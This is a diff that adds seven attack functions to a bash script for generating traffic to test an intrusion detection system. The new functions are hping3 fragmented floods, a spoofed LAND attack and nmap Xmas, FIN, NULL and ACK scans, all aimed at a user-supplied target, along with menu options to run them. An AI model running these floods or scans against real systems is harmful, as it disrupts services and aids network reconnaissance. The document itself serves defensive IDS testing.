@@ -440,6 +440,163 @@ attack_dns_amplification() {
     echo ""
 }
 
+# Attack 12: ARP Spoofing Simulation (Detected as "suspicious_traffic")
+attack_arp_spoof() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 12: ARP Spoofing Simulation (Should trigger detection)"
+    echo "=========================================="
+    echo "Simulating ARP spoofing by sending many ARP requests..."
+    echo "This should be detected as suspicious traffic"
+    echo ""
+    
+    if command -v arping >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
+        echo "Using arping for ARP spoofing simulation..."
+        for i in {1..200}; do
+            sudo arping -c 1 -I eth0 $TARGET >/dev/null 2>&1 &
+            if [ $((i % 50)) -eq 0 ]; then
+                echo "  Sent $i ARP requests..."
+            fi
+        done
+        wait
+    else
+        echo "arping with sudo required for ARP spoofing attack"
+        echo "Or use: sudo ./attack_scripts.sh $TARGET $PORT"
+    fi
+    
+    echo ""
+    echo "✅ ARP spoofing simulation complete. Check IDS dashboard."
+    echo ""
+}
+
+# Attack 13: Fragmented Packet Attack (Detected as "dos")
+attack_fragmented() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 13: Fragmented Packet Attack (Should trigger 'dos' detection)"
+    echo "=========================================="
+    echo "Sending fragmented packets to $TARGET..."
+    echo "This should be detected as DoS attack"
+    echo ""
+    
+    if command -v hping3 >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
+        echo "Using hping3 for fragmented packets..."
+        timeout 30 sudo hping3 -f -p $PORT --flood $TARGET 2>/dev/null || true
+    else
+        echo "hping3 with sudo required for fragmented packet attack"
+    fi
+    
+    echo ""
+    echo "✅ Fragmented packet attack complete. Check IDS dashboard for 'dos' detection."
+    echo ""
+}
+
+# Attack 14: Land Attack (Detected as "dos")
+attack_land() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 14: Land Attack (Should trigger 'dos' detection)"
+    echo "=========================================="
+    echo "Sending LAND attack packets to $TARGET..."
+    echo "This should be detected as DoS attack"
+    echo ""
+    
+    if command -v hping3 >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
+        echo "Using hping3 for LAND attack..."
+        timeout 30 sudo hping3 -a $TARGET -p $PORT -s $PORT -S $TARGET 2>/dev/null || true
+    else
+        echo "hping3 with sudo required for LAND attack"
+    fi
+    
+    echo ""
+    echo "✅ LAND attack complete. Check IDS dashboard for 'dos' detection."
+    echo ""
+}
+
+# Attack 15: Xmas Tree Scan (Detected as "port_scan" or "probe")
+attack_xmas_scan() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 15: Xmas Tree Scan (Should trigger 'port_scan' detection)"
+    echo "=========================================="
+    echo "Performing Xmas tree scan on $TARGET..."
+    echo "This should be detected as port scan"
+    echo ""
+    
+    if command -v nmap >/dev/null 2>&1; then
+        nmap -sX -p 1-100 $TARGET
+    else
+        echo "nmap required for Xmas tree scan"
+    fi
+    
+    echo ""
+    echo "✅ Xmas tree scan complete. Check IDS dashboard for 'port_scan' detection."
+    echo ""
+}
+
+# Attack 16: FIN Scan (Detected as "port_scan" or "probe")
+attack_fin_scan() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 16: FIN Scan (Should trigger 'port_scan' detection)"
+    echo "=========================================="
+    echo "Performing FIN scan on $TARGET..."
+    echo "This should be detected as port scan"
+    echo ""
+    
+    if command -v nmap >/dev/null 2>&1; then
+        nmap -sF -p 1-100 $TARGET
+    else
+        echo "nmap required for FIN scan"
+    fi
+    
+    echo ""
+    echo "✅ FIN scan complete. Check IDS dashboard for 'port_scan' detection."
+    echo ""
+}
+
+# Attack 17: NULL Scan (Detected as "port_scan" or "probe")
+attack_null_scan() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 17: NULL Scan (Should trigger 'port_scan' detection)"
+    echo "=========================================="
+    echo "Performing NULL scan on $TARGET..."
+    echo "This should be detected as port scan"
+    echo ""
+    
+    if command -v nmap >/dev/null 2>&1; then
+        nmap -sN -p 1-100 $TARGET
+    else
+        echo "nmap required for NULL scan"
+    fi
+    
+    echo ""
+    echo "✅ NULL scan complete. Check IDS dashboard for 'port_scan' detection."
+    echo ""
+}
+
+# Attack 18: ACK Scan (Detected as "port_scan" or "probe")
+attack_ack_scan() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 18: ACK Scan (Should trigger 'port_scan' detection)"
+    echo "=========================================="
+    echo "Performing ACK scan on $TARGET..."
+    echo "This should be detected as port scan"
+    echo ""
+    
+    if command -v nmap >/dev/null 2>&1; then
+        nmap -sA -p 1-100 $TARGET
+    else
+        echo "nmap required for ACK scan"
+    fi
+    
+    echo ""
+    echo "✅ ACK scan complete. Check IDS dashboard for 'port_scan' detection."
+    echo ""
+}
+
 # Main menu
 show_menu() {
     echo ""
@@ -455,10 +612,17 @@ show_menu() {
     echo "  9) Slowloris (dos detection)"
     echo " 10) Brute Force (brute_force detection)"
     echo " 11) DNS Amplification (dos detection)"
-    echo " 12) Run ALL attacks sequentially"
-    echo " 13) Exit"
+    echo " 12) ARP Spoofing (suspicious_traffic)"
+    echo " 13) Fragmented Packet Attack (dos detection)"
+    echo " 14) LAND Attack (dos detection)"
+    echo " 15) Xmas Tree Scan (port_scan detection)"
+    echo " 16) FIN Scan (port_scan detection)"
+    echo " 17) NULL Scan (port_scan detection)"
+    echo " 18) ACK Scan (port_scan detection)"
+    echo " 19) Run ALL attacks sequentially"
+    echo " 20) Exit"
     echo ""
-    read -p "Enter choice [1-13]: " choice
+    read -p "Enter choice [1-20]: " choice
     
     case $choice in
         1) attack_port_scan ;;
@@ -472,7 +636,14 @@ show_menu() {
         9) attack_slowloris ;;
         10) attack_brute_force ;;
         11) attack_dns_amplification ;;
-        12) 
+        12) attack_arp_spoof ;;
+        13) attack_fragmented ;;
+        14) attack_land ;;
+        15) attack_xmas_scan ;;
+        16) attack_fin_scan ;;
+        17) attack_null_scan ;;
+        18) attack_ack_scan ;;
+        19) 
             attack_port_scan
             sleep 5
             attack_syn_flood
@@ -490,13 +661,21 @@ show_menu() {
             attack_brute_force
             sleep 5
             attack_dns_amplification
+            sleep 5
+            attack_xmas_scan
+            sleep 5
+            attack_fin_scan
+            sleep 5
+            attack_null_scan
+            sleep 5
+            attack_ack_scan
             echo ""
             echo "=========================================="
             echo "✅ All attacks completed!"
             echo "Check your IDS dashboard for all detections."
             echo "=========================================="
             ;;
-        13) echo "Exiting..."; exit 0 ;;
+        20) echo "Exiting..."; exit 0 ;;
         *) echo "Invalid choice. Try again."; show_menu ;;
     esac
 }
@@ -520,6 +699,13 @@ if [ "$3" != "" ]; then
         slowloris) attack_slowloris ;;
         brute) attack_brute_force ;;
         dns) attack_dns_amplification ;;
+        arp) attack_arp_spoof ;;
+        frag) attack_fragmented ;;
+        land) attack_land ;;
+        xmas) attack_xmas_scan ;;
+        fin) attack_fin_scan ;;
+        null) attack_null_scan ;;
+        ack) attack_ack_scan ;;
         all)
             attack_port_scan
             sleep 5
